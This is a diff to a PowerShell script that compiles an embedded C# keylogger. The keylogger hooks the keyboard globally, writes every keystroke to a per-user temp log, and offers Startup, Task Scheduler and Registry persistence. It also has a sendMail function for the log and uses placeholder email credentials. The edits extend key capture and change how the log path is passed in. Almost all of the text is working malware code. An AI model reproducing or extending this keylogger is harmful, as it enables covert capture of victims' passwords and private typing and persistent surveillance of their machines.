@@ -5,12 +5,11 @@ Param (
 	[string]$Type = "Startup"
 )
 
+$Email = "email@email.com"
+$Password = "MyPasswords"
 
-$Email = "username@gmail.com"
-$Password = "password"
 
 $validPersistanceTypes = "Startup", "TaskScheduler", "Registry", "All"
-
 
 function sendMail($logFile="$env:temp\$env:username.log") {
 	
@@ -77,20 +76,26 @@ namespace KeyLogger {
     private const int WM_KEYDOWN = 0x0100;
 	private const int VK_RETURN = 0x0D;  // Enter key
 	private const int VK_SPACE = 0x20;   // Spacebar
+	private const int VK_OEM_PERIOD = 0xBE;   // For any country/region, the "." key
 
-    private const string logFileName = "C:\\Users\\0xrand0m\\AppData\\Local\\Temp\\0xrand0m.log";
     private static StreamWriter logFile;
 
     private static HookProc hookProc = HookCallback;
     private static IntPtr hookId = IntPtr.Zero;
 
-    public static void Main() {
-      logFile = File.AppendText(logFileName);
-      logFile.AutoFlush = true;
+    public static void Main(string[] args) {
+	  if (args.Length > 0) {
+		string logFileName = args[0];
+		Console.WriteLine("Writing keys to " + logFileName);
+	  	logFile = File.AppendText(logFileName);
+      	logFile.AutoFlush = true;
 
-      hookId = SetHook(hookProc);
-      Application.Run();
-      UnhookWindowsHookEx(hookId);
+      	hookId = SetHook(hookProc);
+      	Application.Run();
+      	UnhookWindowsHookEx(hookId);
+	} else {
+			Console.WriteLine("No log file path provided."); 
+		}
     }
 
     private static IntPtr SetHook(HookProc hookProc) {
@@ -107,6 +112,8 @@ namespace KeyLogger {
 			logFile.WriteLine();
 		} else if (vkCode == VK_SPACE) {
 			logFile.Write(" ");
+		} else if (vkCode == VK_OEM_PERIOD) {
+		    logFile.Write(".");
 		} else {
         	logFile.Write((Keys)vkCode);
 		}
@@ -130,7 +137,8 @@ namespace KeyLogger {
 }
 "@
 Add-Type -TypeDefinition $source -ReferencedAssemblies System.Windows.Forms
-[KeyLogger.Program]::Main();
+$logFileName = "$env:temp\$env:username.log"
+[KeyLogger.Program]::Main($logFileName);
 }
 function SimpleKeyLog($LogFile="$env:temp\$env:username.log") {
 	$LootFile = New-Item -Path $LogFile -ItemType File -Force
